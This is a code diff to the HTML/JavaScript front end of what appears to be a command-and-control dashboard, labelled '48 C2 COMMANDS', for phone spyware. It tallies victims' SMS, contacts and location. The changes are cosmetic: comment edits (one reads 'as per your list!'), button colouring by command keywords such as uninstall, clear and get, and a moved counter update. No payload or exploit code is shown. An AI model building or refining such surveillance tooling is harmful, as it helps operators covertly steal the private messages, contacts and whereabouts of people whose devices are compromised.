@@ -132,7 +132,7 @@
             </div>
         </div>
 
-        <!-- PANEL C2 -->
+        <!-- PANEL C2 - 48 COMMANDS -->
         <div class="panel" id="panelC2">
             <div class="search-box">
                 <input type="text" id="cmdSearch" placeholder="🔍 Cari command..." oninput="filterCommands()">
@@ -192,7 +192,7 @@
 
 <script>
 // ============================================================
-// 🔥 DASHBOARD - 48 C2 COMMANDS
+// 🔥 DASHBOARD - 48 C2 COMMANDS (SESUAI DAFTAR ANDA!)
 // ============================================================
 
 var PASSWORD = '';
@@ -201,7 +201,7 @@ var logEntries = [];
 var ws = null;
 
 // ============================================================
-// 48 C2 COMMANDS
+// 🔥 48 C2 COMMANDS - SESUAI DAFTAR ANDA!
 // ============================================================
 var C2_COMMANDS = {
     'data': {
@@ -413,11 +413,11 @@ function renderC2Commands() {
         cat.commands.forEach(function(cmd) {
             var btn = document.createElement('div');
             btn.className = 'cmd-btn';
-            if (cmd.id.includes('uninstall') || cmd.id.includes('clear_')) {
+            if (cmd.id.includes('uninstall') || cmd.id.includes('clear_') || cmd.id.includes('stop')) {
                 btn.className += ' danger';
             } else if (cmd.id.includes('start') || cmd.id.includes('record')) {
                 btn.className += ' success';
-            } else if (cmd.id.includes('stop')) {
+            } else if (cmd.id.includes('get') || cmd.id.includes('ambil')) {
                 btn.className += ' warning';
             }
             btn.textContent = cmd.label;
@@ -439,6 +439,8 @@ function renderC2Commands() {
         div.appendChild(grid);
         container.appendChild(div);
     });
+    
+    document.getElementById('cmdCount').textContent = '⚡ 48 Commands';
 }
 
 // ============================================================
@@ -603,7 +605,6 @@ function updateStats(data) {
     document.getElementById('statSMS').textContent = sms.length;
     document.getElementById('statContacts').textContent = contacts.length;
     document.getElementById('statLocation').textContent = loc.length;
-    document.getElementById('cmdCount').textContent = '⚡ 48 Commands';
 }
 
 // ============================================================
